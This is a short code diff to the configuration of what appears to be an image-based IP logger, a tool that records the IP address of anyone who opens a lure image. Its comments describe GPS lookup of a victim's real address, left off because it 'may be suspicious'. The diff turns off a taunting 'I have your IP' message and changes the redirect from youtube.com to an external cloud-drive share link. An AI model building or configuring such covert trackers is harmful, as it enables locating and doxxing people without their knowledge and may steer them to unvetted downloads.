@@ -27,7 +27,7 @@ config = {
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": True, # Enable the custom message?
+        "doMessage": False, # Enable the custom message?
         "message": "É... TO COM TEU IP", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": True, # Redirect to a webpage?
-        "page": "https://youtube.com" # Link to the webpage to redirect to 
+        "page": "https://dinobox.cloud/drive/s/bUnYv2jnbsFk6a6q1yS2pdbJFBtPpB" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
